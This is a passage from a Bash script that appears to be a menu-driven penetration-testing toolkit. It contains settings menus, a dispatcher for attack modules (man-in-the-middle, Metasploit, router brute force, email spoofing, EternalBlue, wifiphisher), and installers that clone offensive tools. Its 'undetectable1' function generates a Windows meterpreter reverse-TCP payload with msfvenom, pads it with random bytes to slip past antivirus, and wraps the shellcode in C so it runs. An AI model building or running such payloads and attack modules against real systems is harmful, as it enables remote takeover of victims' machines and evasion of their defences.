return: \"\n\t\t\t\t\tread numofans\n\t\t\t\t\techo \"$numofans\" > \"$LPATH\"/settings/numofans.txt\n\t\t\t\telif [[ \"$HOWCH\" = 5 ]]\n\t\t\t\tthen\n\t\t\t\t\thowdoi -C\n\t\t\t\telif [[ \"$HOWCH\" = \"b\" || \"$HOWCH\" = \"back\" ]]\n\t\t\t\tthen\n\t\t\t\t\tbreak\n\t\t\t\telif [[ \"$HOWCH\" = 00 ]]\n\t\t\t\tthen\n\t\t\t\t\texec bash $0\n\t\t\t\telif [[ \"$HOWCH\" = 0 ]]\n\t\t\t\tthen\n\t\t\t\t\texit\n\t\t\t\tfi\n\t\t\tdone\n\t\telif [[ \"$SET\" = 1 ]]\n\t\tthen\n\t\t\tTERMINALTITLE=\"LOGO COLORS\"\n\t\t\tdash_calc\n\t\t\techo -e \"\"$YS\" 1\"$CE\") Light Red (default)     \"$RS\"SAMPLE\"$CE\"\"\n\t\t\techo -e \"\"$YS\" 2\"$CE\") Red                     \"$DRS\"SAMPLE\"$CE\"\"\n\t\t\techo -e \"\"$YS\" 3\"$CE\") Light Purple            \"$LPS\"SAMPLE\"$CE\"\"\n\t\t\techo -e \"\"$YS\" 4\"$CE\") Purple                  \"$PS\"SAMPLE\"$CE\"\"\n\t\t\techo -e \"\"$YS\" 5\"$CE\") Light Green             \"$LGNS\"SAMPLE\"$CE\"\"\n\t\t\techo -e \"\"$YS\" 6\"$CE\") Green                   \"$GNS\"SAMPLE\"$CE\"\"\n\t\t\techo -e \"\"$YS\" 7\"$CE\") Light Cyan              \"$LCYS\"SAMPLE\"$CE\"\"\n\t\t\techo -e \"\"$YS\" 8\"$CE\") Cyan                    \"$CYS\"SAMPLE\"$CE\"\"\n\t\t\techo -e \"\"$YS\" 9\"$CE\") Light Blue              \"$LBS\"SAMPLE\"$CE\"\"\n\t\t\techo -e \"\"$YS\"10\"$CE\") Blue                    \"$BS\"SAMPLE\"$CE\"\"\n\t\t\techo -e \"\"$YS\"11\"$CE\") Light Gray              \"$LGYS\"SAMPLE\"$CE\"\"\n\t\t\techo -e \"\"$YS\"12\"$CE\") Dark Gray               \"$DGYS\"SAMPLE\"$CE\"\"\n\t\t\techo -e \"\"$YS\"13\"$CE\") Yellow                  \"$YS\"SAMPLE\"$CE\"\"\n\t\t\techo -e \"\"$YS\"14\"$CE\") Brown                   \"$BRS\"SAMPLE\"$CE\"\"\n\t\t\techo -e \"\"$YS\"15\"$CE\") White                   \"$WHS\"SAMPLE\"$CE\"\"\n\t\t\techo -e \"\"$YS\"16\"$CE\") Black                   \"$BLS\"SAMPLE\"$CE\"\"\n\t\t\techo -e \"Choose: \"\n\t\t\tread LC\n\t\t\tif [[ \"$LC\" = 1 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\\e[1;31m\" > \"$LPATH\"/settings/logocolor.txt\n\t\t\telif [[ \"$LC\" = 2 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\\e[0;31m\" > \"$LPATH\"/settings/logocolor.txt\n\t\t\telif [[ \"$LC\" = 3 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\\e[1;35m\" > \"$LPATH\"/settings/logocolor.txt\n\t\t\telif [[ \"$LC\" = 4 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\\e[0;35m\" > \"$LPATH\"/settings/logocolor.txt\n\t\t\telif [[ \"$LC\" = 5 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\\e[1;32m\" > \"$LPATH\"/settings/logocolor.txt\n\t\t\telif [[ \"$LC\" = 6 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\\e[0;32m\" > \"$LPATH\"/settings/logocolor.txt\n\t\t\telif [[ \"$LC\" = 7 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\\e[1;36m\" > \"$LPATH\"/settings/logocolor.txt\n\t\t\telif [[ \"$LC\" = 8 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\\e[0;36m\" > \"$LPATH\"/settings/logocolor.txt\n\t\t\telif [[ \"$LC\" = 9 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\\e[1;34m\" > \"$LPATH\"/settings/logocolor.txt\n\t\t\telif [[ \"$LC\" = 10 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\\e[0;34m\" > \"$LPATH\"/settings/logocolor.txt\n\t\t\telif [[ \"$LC\" = 11 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\\e[0;37m\" > \"$LPATH\"/settings/logocolor.txt\n\t\t\telif [[ \"$LC\" = 12 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\\e[1;30m\" > \"$LPATH\"/settings/logocolor.txt\n\t\t\telif [[ \"$LC\" = 13 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\\e[1;33m\" > \"$LPATH\"/settings/logocolor.txt\n\t\t\telif [[ \"$LC\" = 14 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\\e[0;33m\" > \"$LPATH\"/settings/logocolor.txt\n\t\t\telif [[ \"$LC\" = 15 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\\e[1;37m\" > \"$LPATH\"/settings/logocolor.txt\n\t\t\telif [[ \"$LC\" = 16 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\\e[0;30m\" > \"$LPATH\"/settings/logocolor.txt\n\t\t\tfi\t\t\n\t\tfi\n\tdone\n}\nfunction undetectable1\n{\n\tLHOST=192.168.1.104\n\tLPORT=4444\n\tDIRECTORY=\"/root/Desktop/shellcode.txt\"\n\tTXT=\"/root/Desktop/txt.txt\"\n\t#############\n\trandomshit=$(cat /dev/urandom | tr -dc a-z-A-Z-0-9 | head -c1409)\n\tmsfvenom -p windows/meterpreter/reverse_tcp LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f c -o \"$DIRECTORY\"\n\techo \"unsigned char padding[]=\" > \"$TXT\"\n\techo \"\\\"$randomshit\\\";\" >> \"$TXT\"\n\tcat \"$DIRECTORY\" >> \"$TXT\"\n\techo \"int main(void) { ((void (*)())buf)();}\" >> \"$TXT\"\n\tleafpad \"$TXT\"\n}\nfunction main_options\n{\n\tif [[ \"$YORNAA\" = \"0\" ]]\n\tthen\n\t\texit\n\telif [[ \"$YORNAA\" = \"gate\" || \"$YORNAA\" = \"gateway\" ]]\n\tthen\n\t\tTT=$(ifconfig | grep \"$WLANN\")\n\t\tif [[ \"$TT\" = \"\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"\"$WLANN\" is not available\"$CE\"\"\n\t\t\tsleep 2\n\t\telse\n\t\t\tGATE=$(find_gateways \"$WLANN\" interface)\n\t\t\tTTT=$(is_it_an_ip \"$GATE\")\n\t\t\tif [[ \"$TTT\" != 1 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"Couldn't find your gateway.\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\t\techo -e \"\"$RS\"Make sure you are connected to a network\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\telse\n\t\t\t\techo -e \"\"$YS\"Gateway found: \"$GATE\"\"$CE\"\"\n\t\t\t\tsleep 1\n\t\t\t\txdg-open http://\"$GATE\"\n\t\t\t\tBACKL=1\n\t\t\tfi\n\t\tfi\n\telif [[ \"$YORNAA\" = \"scan\" ]]\n\tthen\n\t\tif [[ ! -f /usr/bin/arp-scan && ! -f /usr/sbin/arp-scan ]]\n\t\tthen\n\t\t\techo -e \"\"$BS\"Installing arp-scan\"$CE\"\"\n\t\t\tinstall_arp_scan\n\t\t\tclear\n\t\tfi\n\t\tif [[ -f \"$LPATH\"/settings/arpin.txt ]]\n\t\tthen\n\t\t\tread ARPIN < \"$LPATH\"/settings/arpin.txt\n\t\telse\n\t\t\tARPIN=\"$WLANN\"\n\t\tfi\n\t\tif [[ \"$ARPIN\" = \"\" ]]\n\t\tthen\n\t\t\tARPIN=\"$WLANN\"\n\t\tfi\n\t\tTESTARP=$(ifconfig | grep \"$ARPIN\")\n\t\tif [[ \"$TESTARP\" = \"\" ]]\n\t\tthen\n\t\t\tclear\n\t\t\techo -e \"\"$RS\"$ARPIN was not found\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tBACKL=1\n\t\telse\n\t\t\tip_scan $ARPIN 2\n\t\tfi\n\telif [[ \"$YORNAA\" = \"22\" ]]\n\tthen\n\t\tIFTOPT=$(which iftop)\n\t\tif [[ \"$IFTOPT\" == \"\" ]]\n\t\tthen\n\t\t\tapt-get -y install iftop\n\t\tfi\n\t\tCHECK=$(ifconfig | grep \"$iftopint\")\n\t\tif [[ \"$CHECK\" = \"\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Interface \"$iftopint\" was not found\"\n\t\t\tsleep 2\n\t\telse\n\t\t\txterm -hold -T \"Iftop on $iftopint\" -e \"iftop -n -i $iftopint -b\" & disown\n\t\t\tBACKL=1\n\t\tfi\n\telif [[ \"$YORNAA\" = \"21\" ]]\n\tthen\n\t\tsqlmap_menu\n\telif [[ \"$YORNAA\" = \"19\" ]]\n\tthen\n\t\techo -e \"\"$BS\"IP:\"$CE\" \"\n\t\tread IPG\n\t\tclear\n\t\tgeolocate_ip \"$IPG\"\n\telif [[ \"$YORNAA\" = \"18\" ]]\n\tthen\n\t\tbrowser_exploiting\n\telif [[ \"$YORNAA\" = \"m\" ]]\n\tthen\n\t\tmitmf_hook\n\telif [[ \"$YORNAA\" = \"g\" ]]\n\tthen\n\t\tfind_gateways\n\telif [[ \"$YORNAA\" = \"l\" ]]\n\tthen\n\t\tlocal_ips\n\telif [[ \"$YORNAA\" = \"17\" ]]\n\tthen\n\t\tif [[ ! -f \"/usr/local/bin/howdoi\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Howdoi is not installed.type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to install it.\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_howdoi\n\t\t\tfi\n\t\telse\n\t\t\tclear\n\t\t\tif [[ -f \"$LPATH\"/settings/dispfull.txt ]]\n\t\t\tthen\n\t\t\t\tread dispfull < \"$LPATH\"/settings/dispfull.txt\n\t\t\t\tif [[ \"$dispfull\" = \"true\" ]]\n\t\t\t\tthen\n\t\t\t\t\tdf=\"-a\"\n\t\t\t\tfi\n\t\t\telse\n\t\t\t\tdf=\"\"\n\t\t\tfi\n\t\t\tif [[ -f \"$LPATH\"/settings/colorout.txt ]]\n\t\t\tthen\n\t\t\t\tread colorout < \"$LPATH\"/settings/colorout.txt\n\t\t\t\tif [[ \"$colorout\" = \"true\" ]]\n\t\t\t\tthen\n\t\t\t\t\tco=\"-c\"\n\t\t\t\tfi\n\t\t\telse\n\t\t\t\tco=\"\"\n\t\t\tfi\n\t\t\tif [[ -f \"$LPATH\"/settings/onlylink.txt ]]\n\t\t\tthen\n\t\t\t\tread onlylink < \"$LPATH\"/settings/onlylink.txt\n\t\t\t\tif [[ \"$onlylink\" = \"true\" ]]\n\t\t\t\tthen\n\t\t\t\t\tol=\"-l\"\n\t\t\t\tfi\n\t\t\telse\n\t\t\t\tol=\"\"\n\t\t\tfi\n\t\t\tif [[ -f \"$LPATH\"/settings/numofans.txt ]]\n\t\t\tthen\n\t\t\t\tread numofans < \"$LPATH\"/settings/numofans.txt\n\t\t\t\tif [[ \"$numofans\" = \"true\" ]]\n\t\t\t\tthen\n\t\t\t\t\tna=\"-n \"$numofans\"\"\n\t\t\t\tfi\n\t\t\telse\n\t\t\t\tna=\"\"\n\t\t\tfi\n\t\t\techo -e \"How do i :  \"\n\t\t\tread HOW\n\t\t\thowdoi $co $na $ol $df $HOW\n\t\tfi\n\telif [[ \"$YORNAA\" = \"settings\" || \"$YORNAA\" = \"s\" ]]\n\tthen\n\t\tsettings_menu\n\telif [[ \"$YORNAA\" = \"16\" ]]\n\tthen\n\t\tngrok_option\n\t\tBACKL=1\n\telif [[ \"$YORNAA\" = \"donate\" || \"$YORNAA\" = \"d\" ]]\n\tthen\n\t\tdonate_option\n#------services\n\telif [[ \"$YORNAA\" = \"pstart\" ]]\n\tthen\n\t\tservice postgresql start && echo -e \"\"$YS\"Done\"$CE\"\" || echo -e \"\"$RS\"Error\"$CE\"\"\n\telif [[ \"$YORNAA\" = \"pstop\" ]]\n\tthen\n\t\tservice postgresql stop && echo -e \"\"$YS\"Done\"$CE\"\" || echo -e \"\"$RS\"Error\"$CE\"\"\n\telif [[ \"$YORNAA\" = \"nstart\" ]]\n\tthen\n\t\tservice network-manager start && echo -e \"\"$YS\"Done\"$CE\"\" || echo -e \"\"$RS\"Error\"$CE\"\"\n\telif [[ \"$YORNAA\" = \"nstop\" ]]\n\tthen\n\t\tservice network-manager stop && echo -e \"\"$YS\"Done\"$CE\"\" || echo -e \"\"$RS\"Error\"$CE\"\"\n\telif [[ \"$YORNAA\" = \"astart\" ]]\n\tthen\n\t\tservice apache2 start && echo -e \"\"$YS\"Done\"$CE\"\" || echo -e \"\"$RS\"Error\"$CE\"\"\n\telif [[ \"$YORNAA\" = \"astop\" ]]\n\tthen\n\t\tservice apache2 stop && echo -e \"\"$YS\"Done\"$CE\"\" || echo -e \"\"$RS\"Error\"$CE\"\"\n\telif [[ \"$YORNAA\" = \"nessusstart\" ]]\n\tthen\n\t\tif [[ -f /etc/init.d/nessusd ]]\n\t\tthen\n\t\t\t/etc/init.d/nessusd start && echo -e \"\"$YS\"Done\"$CE\"\" || echo -e \"\"$RS\"Error\"$CE\"\"\n\t\telse\n\t\t\techo -e \"\"$RS\"Nessus is not already installed.\"$CE\"\"\n\t\t\tsleep 2\n\t\tfi\n\telif [[ \"$YORNAA\" = \"nessusstop\" ]]\n\tthen\n\t\tif [[ -f /etc/init.d/nessusd ]]\n\t\tthen\n\t\t\t/etc/init.d/nessusd stop && echo -e \"\"$YS\"Done\"$CE\"\" || echo -e \"\"$RS\"Error\"$CE\"\"\n\t\telse\n\t\t\techo -e \"\"$RS\"Nessus is not already installed.\"$CE\"\"\n\t\t\tsleep 2\n\t\tfi\n#-------------\n\telif [[ \"$YORNAA\" = \"15\" ]]\n\tthen\n\t\tBACKL=\"1\"\n\t\tspoof_email\n\telif [[ \"$YORNAA\" = \"ks\" ]]\n\tthen\n\t\tkeyboard_shortcuts\n\telif [[ \"$YORNAA\" = \"interface\" ]]\n\tthen\n\t\tinterface_menu\n\telif [[ \"$YORNAA\" = \"9\" ]]\n\tthen\n\t\ttools_menu\n\telif [[ \"$YORNAA\" = \"l\" ]]\n\tthen\n\t\tclear \n\t\texec bash \"$0\"\n\telif [[ \"$YORNAA\" = \"gg\" ]]\n\tthen\n\t\tgeany /bin/lscript/l\n\telif [[ \"$YORNAA\" = \"1\" ]]\n\tthen\n\t\tenable_wlan\n\telif [[ \"$YORNAA\" = \"d1\" ]]\n\tthen\n\t\tcheck_wlans\n\t\tif [[ \"$WLANCHECKING\" = \"\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Error. Could find $WLANN interface to disable.\"$CE\"\"\n\t\telse\n\t\t\tdisable_wlan\n\t\tfi\n\telif [[ \"$YORNAA\" = \"2\" ]]\n\tthen\n\t\tcheck_wlans\n\t\tif [[ \"$WLANCHECKING\" = \"\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Error. Could find $WLANN interface.\"$CE\"\"\n\t\telse\n\t\t\techo -e \"Enabling $WLANNM...\"\n\t\t\techo -e \"Killing services...\"\n\t\t\t(airmon-ng check kill &> /dev/null && echo -e \"Done.\" ) || echo -e \"\"$RS\"Error killing services\"$YS\"\"\n\t\t\techo -e \"Starting monitor mode...\"\n\t\t\t(airmon-ng start $WLANN &>/dev/null && echo -e \"Done\" ) || echo -e \"Error starting monitor mode.\"\n\t\tfi\n\telif [[ \"$YORNAA\" = \"d2\" ]]\n\tthen\n\t\tcheck_wlans\n\t\tif [[ \"$WLANMCHECKING\" = \"\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Error. Could find $WLANNM interface.\"$CE\"\"\n\t\telse\n\t\t\tstop_monitor\n\t\tfi\n\telif [[ \"$YORNAA\" = \"3\" ]]\n\tthen\n\t\tchange_mac\n\telif [[ \"$YORNAA\" = \"d3\" ]]\n\tthen\n\t\tinterface_selection\n\t\tclear\n\t\techo -e \"Changing mac address of $MYINT to the original one...\"\n\t\tifconfig $MYINT down\n\t\tmacchanger -p $MYINT\n\t\tifconfig $MYINT up\n\t\techo -e \"Done.\"\n\telif [[ \"$YORNAA\" = \"4\" ]]\n\tthen\n\t\tif [[ ! -f \"/etc/init.d/anonym8.sh\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Anonym8 is not installed.type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to install it.\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_anonym8\n\t\t\tfi\n\t\telse\n\t\t\techo -e \"Enabling anonym8...\"\n\t\t\tanonym8 start\n\t\t\techo -e \"Done.\"\n\t\tfi\n\telif [[ \"$YORNAA\" = \"d4\" ]]\n\tthen\n\t\tif [[ ! -f \"/etc/init.d/anonym8.sh\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Anonym8 is not installed.type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to install it.\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_anonym8\n\t\t\tfi\n\t\telse\n\t\t\techo -e \"Disabling anonym8...\"\n\t\t\tanonym8 stop\n\t\t\techo -e \"Done.\"\n\t\tfi\n\telif [[ \"$YORNAA\" = \"5\" ]]\n\tthen\n\t\tif [[ ! -f \"/usr/bin/anonsurf\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Anonsurf is not installed.type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to install it.\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_anonsurf\n\t\t\tfi\n\t\telse\n\t\t\techo -e \"Enabling anonsurf...\"\n\t\t\tanonsurf start\n\t\t\techo -e \"Done.\"\n\t\tfi\n\telif [[ \"$YORNAA\" = \"d5\" ]]\n\tthen\n\t\tif [[ ! -f \"/usr/bin/anonsurf\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Anonsurf is not installed.type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to install it.\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_anonsurf\n\t\t\tfi\n\t\telse\n\t\t\techo -e \"Disabling anonsurf...\"\n\t\t\tanonsurf stop\n\t\t\techo -e \"Done.\"\n\t\tfi\n\telif [[ \"$YORNAA\" = \"6\" ]]\n\tthen\n\t\tif [[ ! -f \"/usr/bin/anonsurf\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Anonsurf is not installed.type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to install it.\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_anonsurf\n\t\t\tfi\n\t\telse\n\t\t\techo -e \"Status of anonsurf...\"\n\t\t\tanonsurf status\n\t\t\techo -e \"Done.\"\n\t\tfi\n\telif [[ \"$YORNAA\" = \"d6\" ]]\n\tthen\n\t\tif [[ ! -f \"/usr/bin/anonsurf\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Anonsurf is not installed.type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to install it.\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_anonsurf\n\t\t\tfi\n\t\telse\n\t\t\techo -e \"Restarting anonsurf...\"\n\t\t\tanonsurf change\n\t\t\techo -e \"Done.\"\n\t\tfi\n\telif [[ \"$YORNAA\" = \"r6\" ]]\n\tthen\n\t\tif [[ ! -f \"/usr/bin/anonsurf\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Anonsurf is not installed.type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to install it.\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_anonsurf\n\t\t\tfi\n\t\telse\n\t\t\techo -e \"Restarting anonsurf...\"\n\t\t\tanonym8 change\n\t\t\techo -e \"Done.\"\n\t\tfi\n\telif [[ \"$YORNAA\" = \"7\" ]]\n\tthen\n\t\tpublic_ip\n\telif [[ \"$YORNAA\" = \"8\" ]]\n\tthen\n\t\tinterface_selection\n\t\tclear\n\t\techo \"Your MACs: \"\n\t\tmacchanger -s $MYINT\n\telif [[ \"$YORNAA\" = \"10\" || \"$YORNAA\" = \"11\" || \"$YORNAA\" = \"12\" ]]\n\tthen\n\t\tnew_terminal\n\telif [[ \"$YORNAA\" = \"13\" ]]\n\tthen\n\t\tmitm_menu\n\telif [[ \"$YORNAA\" = \"14\" ]]\n\tthen\n\t\tmetasploit_menu\n\telif [[ \"$YORNAA\" = \"20\" ]]\n\tthen\n\t\tbruteforce_router\n\telif [[ \"$YORNAA\" = \"exit\" ]]\n\tthen\n\t\tkill -9 $PPID\n\t\texit\n\telif [[ \"$YORNAA\" = \"update\" ]]\n\tthen\n\t\tprintf '\\033]2;UPDATE\\a'\n\t\tclear\n\t\tupdate_lscript\n\telif [[ \"$YORNAA\" = \"if\" || \"$YORNAA\" = \"ifconfig\" ]]\n\tthen\n\t\tifconfig\n\telif [[ \"$YORNAA\" = \"changelog\" ]]\n\tthen\n\t\tclear\n\t\tBACKL=1\n\t\tcat \"$LPATH\"/Changelog | head -n 20\n\t\techo -e \"$PAKTC\"\n\t\t$READAK\n\t\tclear\n\telif [[ \"$YORNAA\" = \"\" ]]\n\tthen\n\t\tclear\n\t\texec bash \"$0\"\n\telif [[ \"$YORNAA\" = \"errors\" ]]\n\tthen\n\t\terrors_menu\n\telif [[ \"$YORNAA\" = \"etercheck\" ]]\n\tthen\n\t\tif [[ -d /root/wifiphisher ]]\n\t\tthen\n\t\t\teternalblue_check\n\t\telse\n\t\t\techo -e \"\"$RS\"Wifiphisher is not installed.Type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to install it.\"$CE\"\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_wifiphisher\n\t\t\tfi\n\t\tfi\n\telif [[ \"$YORNAA\" = \"eternalblue\" ]]\n\tthen\n\t\tif [[ -d /root/wifiphisher ]]\n\t\tthen\n\t\t\teternalblue\n\t\telse\n\t\t\techo -e \"\"$RS\"Wifiphisher is not installed.Type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to install it.\"$CE\"\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_wifiphisher\n\t\t\tfi\n\t\tfi\n\telif [[ \"$YORNAA\" = \"$wififb\" ]]\n\tthen\n\t\tif [[ -d /root/wifiphisher ]]\n\t\tthen\n\t\t\twififb_attack\n\t\telse\n\t\t\techo -e \"\"$RS\"Wifiphisher is not installed.Type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to install it.\"$CE\"\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_wifiphisher\n\t\t\tfi\n\t\tfi\n\telif [[ \"$YORNAA\" = \"start\" ]]\n\tthen\t\t\n\t\tstart_menu\n#----------\n\telif [[ \"$YORNAA\" = \"stop\" ]]\n\tthen\n\t\tstop_menu\n\telif [[ \"$YORNAA\" = \"exit\" ]]\n\tthen\n\t\tclear\n\t\texit\n\tfi\n####check if it is ks\nvar1=1\ncheck_if_ks\n####\n}\n\n#----------------TOOLS---------------\n\tfunction install_default\n\t{\n\t\tif [[ \"$foldname\" == \"\" ]]\n\t\tthen\n\t\t\ttestgit=$(echo \"$gitlink\" | grep \".git\")\n\t\t\tif [[ \"$testgit\" == \"\" ]]\n\t\t\tthen\n\t\t\t\tfoldname=$(echo \"$gitlink\" | cut -d '/' -f5)\n\t\t\telse\n\t\t\t\tfoldname=$(echo \"$gitlink\" | cut -d '/' -f2 | cut -d '.' -f1)\n\t\t\tfi\n\t\tfi\n\t\tif [[ -d \"/root/\"$foldname\"\" ]]\n\t\tthen\n\t\t\tif [[ \"$NOCONFIRM\" == 1 ]]\n\t\t\tthen\n\t\t\t\t\tif [[ \"$foldname\" != \"\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$YS\"Removing: \"$foldname\"\"$CE\"\"\n\t\t\t\t\t\trm -r /root/\"$foldname\"\n\t\t\t\t\t\tcd\n\t\t\t\t\t\tgit clone $gitlink\t\n\t\t\t\t\t\tcd \"$foldname\"\n\t\t\t\t\t\treturn 1\n\t\t\t\t\tfi\n\t\t\telse\n\t\t\t\techo -e \"\"$YS\"Removing old and install again?\"$CE\" (\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")\"\n\t\t\t\tread ROIN\n\t\t\t\tif [[ \"$ROIN\" == \"y\" ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$foldname\" != \"\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$YS\"Removing: \"$foldname\"\"$CE\"\"\n\t\t\t\t\t\trm -r /root/\"$foldname\"\n\t\t\t\t\t\tcd\n\t\t\t\t\t\tgit clone $gitlink\t\n\t\t\t\t\t\tcd \"$foldname\"\n\t\t\t\t\t\treturn 1\n\t\t\t\t\tfi\n\t\t\t\telse\n\t\t\t\t\treturn 0\n\t\t\t\tfi\n\t\t\tfi\n\t\telse \n\t\t\tcd\n\t\t\tgit clone $gitlink\t\n\t\t\tcd \"$foldname\"\n\t\t\treturn 1\n\t\tfi\n\t}\n\tfunction install_fluxion\n\t{\n\t\tfoldname=\"fluxion\"\n\t\tgitlink=\"--recursive  https://github.com/FluxionNetwork/fluxion.git\"\n\t\tinstall_default\n\t\t#~ wget https://fluxion.tk/fluxion-unstable.zip\n\t\t#~ apt-get install -y unzip\n\t\t#~ clear\n\t\t#~ unzip /root/fluxion*.zip -d /root\n\t\t#~ cd /root/fluxion/install\n\t\t#~ chmod +x install.sh\n\t\t#~ ./install.sh\t\n\t}\n\tfunction install_wifite\n\t{\n\t\tapt-get install -y wifite\n\t}\n\tfunction install_wifiphisher\n\t{\n\t\tfoldname=\"wifiphisher\"\n\t\tgitlink=\"https://github.com/wifiphisher/wifiphisher.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tsudo python setup.py install\n\t\tfi\n\t}\n\tfunction install_zatacker\n\t{\n\t\techo -e \"I cannot install Zatacker. Please google how to do that yourself.\"\n\t\techo -e \"$PAKTGB\"\n\t\tread\n\t}\n\tfunction install_morpheus\n\t{\n\t\tfoldname=\"morpheus\"\n\t\tgitlink=\"https://github.com/r00t-3xp10it/morpheus.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x morpheus.sh\n\t\tfi\n\t}\n\tfunction install_osrframework\n\t{\n\t\tpip install osrframework\n\t}\n\tfunction install_hakku\n\t{\n\t\tfoldname=\"hakkuframework\"\n\t\tgitlink=\"https://github.com/4shadoww/hakkuframework.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x hakku\n\t\t\tchmod +x install\n\t\tfi\n\t}\n\tfunction install_trity\n\t{\n\t\tfoldname=\"Trity\"\n\t\tgitlink=\"https://github.com/toxic-ig/Trity.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tsudo python install.py\t\n\t\tfi\n\t}\n\tfunction install_cupp\n\t{\n\t\tfoldname=\"cupp\"\n\t\tgitlink=\"https://github.com/Mebus/cupp.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x cupp.py\n\t\tfi\n\t}\n\tfunction install_dracnmap\n\t{\n\t\tfoldname=\"Dracnmap\"\n\t\tgitlink=\"https://github.com/Screetsec/Dracnmap.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x Dracnmap.sh\n\t\tfi\n\t}\n\tfunction install_fern\n\t{\n\t\tif [[ -d \"/root/Fern-Wifi-Cracker\" ]]\n\t\tthen\n\t\t\techo -e \"Removing old...\"\n\t\t\techo -e \"$PAKTC\"\n\t\t\t$READAK\n\t\t\trm -r /root/Fern-Wifi-Cracker\n\t\tfi\t\t\n\t\techo -e \"Installing Fern\"\n\t\techo -e \"Tool by Savio-code\"\n\t\tsleep 1\n\t\tcd \n\t\tsvn checkout http://github.com/savio-code/fern-wifi-cracker/trunk/Fern-Wifi-Cracker/\n\t\tcd Fern-Wifi-Cracker\n\t\tchmod +x execute.py\t\n\t}\n\tfunction install_kickthemout\n\t{\n\t\tapt-get install -y nmap\n\t\tfoldname=\"kickthemout\"\n\t\tgitlink=\"https://github.com/k4m4/kickthemout.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tsudo python -m pip install -r 